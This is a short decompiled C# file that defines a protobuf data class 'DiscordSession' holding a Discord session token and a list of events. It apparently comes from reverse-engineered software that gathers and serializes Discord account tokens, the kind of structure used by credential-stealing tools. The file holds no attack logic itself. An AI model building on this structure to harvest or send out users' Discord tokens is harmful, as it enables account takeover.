using System;
using System.Collections.Generic;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x02000167 RID: 359
	[ProtoContract(Name = "DiscordSession")]
	public class DiscordSession
	{
		// Token: 0x170002DA RID: 730
		// (get) Token: 0x06000B81 RID: 2945 RVA: 0x00008DEA File Offset: 0x00006FEA
		// (set) Token: 0x06000B82 RID: 2946 RVA: 0x00008DF2 File Offset: 0x00006FF2
		[ProtoMember(1, Name = "token")]
		public string token { get; set; }

		// Token: 0x170002DB RID: 731
		// (get) Token: 0x06000B83 RID: 2947 RVA: 0x00008DFB File Offset: 0x00006FFB
		// (set) Token: 0x06000B84 RID: 2948 RVA: 0x00008E03 File Offset: 0x00007003
		[ProtoMember(2, Name = "events")]
		public List<Event> events { get; set; }
	}
}
